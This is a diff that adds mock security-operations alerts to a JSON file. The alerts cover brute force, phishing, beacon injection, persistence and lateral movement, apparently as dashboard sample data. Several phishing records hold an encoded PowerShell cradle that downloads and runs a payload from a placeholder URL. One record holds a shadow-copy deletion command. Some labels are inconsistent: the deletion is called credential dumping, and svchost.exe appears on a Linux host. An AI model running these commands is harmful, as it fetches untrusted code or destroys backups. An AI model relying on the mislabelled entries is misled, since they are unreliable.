@@ -1731,5 +1731,163 @@
     },
     "createdAt": "2026-05-31T14:53:15.308Z",
     "updatedAt": "2026-05-31T14:53:15.308Z"
+  },
+  {
+    "_id": "xttnf0z",
+    "timestamp": "2026-05-31T14:53:30.308Z",
+    "severity": "HIGH",
+    "title": "Brute Force SSH Attack",
+    "description": "Multiple failed authentication attempts detected from a known malicious IP address.",
+    "category": "Credential Access",
+    "host": "LINUX-SOC-DB-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "service": "sshd",
+      "failures": 42,
+      "ip": "185.220.101.5",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1110 - Brute Force"
+    },
+    "createdAt": "2026-05-31T14:53:30.309Z",
+    "updatedAt": "2026-05-31T14:53:30.309Z"
+  },
+  {
+    "_id": "c35w9fj",
+    "timestamp": "2026-05-31T14:53:45.308Z",
+    "severity": "CRITICAL",
+    "title": "Active Directory Shadow Copy Access",
+    "description": "VSSADMIN execution matching NTDS.dit exfiltration patterns was observed.",
+    "category": "Credential Dumping",
+    "host": "WIN-SOC-DEV-05",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "command": "vssadmin delete shadows /all /quiet",
+      "process": "cmd.exe",
+      "mitreTactic": "Credential Access",
+      "mitreTechnique": "T1003 - OS Credential Dumping"
+    },
+    "createdAt": "2026-05-31T14:53:45.310Z",
+    "updatedAt": "2026-05-31T14:53:45.310Z"
+  },
+  {
+    "_id": "q3sfx9q",
+    "timestamp": "2026-05-31T14:54:00.309Z",
+    "severity": "CRITICAL",
+    "title": "Malicious EML Attachment Opened",
+    "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "category": "Phishing",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "parent": "outlook.exe",
+      "process": "powershell.exe",
+      "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+      "mitreTactic": "Initial Access",
+      "mitreTechnique": "T1566 - Phishing"
+    },
+    "createdAt": "2026-05-31T14:54:00.311Z",
+    "updatedAt": "2026-05-31T14:54:00.311Z"
+  },
+  {
+    "_id": "fiw9j4a",
+    "timestamp": "2026-05-31T14:54:15.310Z",
+    "severity": "CRITICAL",
+    "title": "Cobalt Strike Beacon Injected",
+    "description": "Suspicious DLL execution detected in memory address space of svchost.exe.",
+    "category": "Malware",
+    "host": "LINUX-WEB-APP-01",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "process": "svchost.exe",
+      "parent": "powershell.exe",
+      "integrityLevel": "SYSTEM",
+      "mitreTactic": "Execution",
+      "mitreTechnique": "T1059 - Command and Scripting Interpreter"
+    },
+    "createdAt": "2026-05-31T14:54:15.312Z",
+    "updatedAt": "2026-05-31T14:54:15.312Z"
+  },
+  {
+    "_id": "nt3owpm",
+    "timestamp": "2026-05-31T14:54:30.312Z",
+    "severity": "HIGH",
+    "title": "Persistence Registry Mechanism Configured",
+    "description": "Unauthorized RunKey modification added targeting system startup scripts.",
+    "category": "Persistence",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "registryKey": "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Spyware",
+      "value": "C:\\Users\\Public\\updater.exe",
+      "mitreTactic": "Persistence",
+      "mitreTechnique": "T1547 - Boot or Logon Autostart Execution"
+    },
+    "createdAt": "2026-05-31T14:54:30.313Z",
+    "updatedAt": "2026-05-31T14:54:30.313Z"
+  },
+  {
+    "_id": "d40j9kt",
+    "timestamp": "2026-05-31T14:54:45.313Z",
+    "severity": "CRITICAL",
+    "title": "Malicious EML Attachment Opened",
+    "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "category": "Phishing",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "parent": "outlook.exe",
+      "process": "powershell.exe",
+      "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+      "mitreTactic": "Initial Access",
+      "mitreTechnique": "T1566 - Phishing"
+    },
+    "createdAt": "2026-05-31T14:54:45.314Z",
+    "updatedAt": "2026-05-31T14:54:45.314Z"
+  },
+  {
+    "_id": "zedq2ab",
+    "timestamp": "2026-05-31T14:55:00.313Z",
+    "severity": "HIGH",
+    "title": "Lateral Movement Attempted",
+    "description": "WMI Win32_Process creation detected targeting remote admin shares.",
+    "category": "Lateral Movement",
+    "host": "WIN-SOC-AD-02",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "protocol": "WMI",
+      "src": "WIN-SOC-DEV-05",
+      "dest": "WIN-SOC-PROD-01",
+      "mitreTactic": "Lateral Movement",
+      "mitreTechnique": "T1021 - Remote Services"
+    },
+    "createdAt": "2026-05-31T14:55:00.315Z",
+    "updatedAt": "2026-05-31T14:55:00.315Z"
+  },
+  {
+    "_id": "lgvrxj9",
+    "timestamp": "2026-05-31T14:55:15.314Z",
+    "severity": "CRITICAL",
+    "title": "Malicious EML Attachment Opened",
+    "description": "Outlook spawned child process powershell.exe executing encoded command line arguments.",
+    "category": "Phishing",
+    "host": "WIN-SOC-DEV-05",
+    "status": "NEW",
+    "assignedTo": "Unassigned",
+    "evidence": {
+      "parent": "outlook.exe",
+      "process": "powershell.exe",
+      "args": "-enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AYgBhAGQAdQByAGwALgBjAG8AbQAvAHAAYQB5AGwAbwBhAGQAJwApAA==",
+      "mitreTactic": "Initial Access",
+      "mitreTechnique": "T1566 - Phishing"
+    },
+    "createdAt": "2026-05-31T14:55:15.315Z",
+    "updatedAt": "2026-05-31T14:55:15.315Z"
   }
 ]
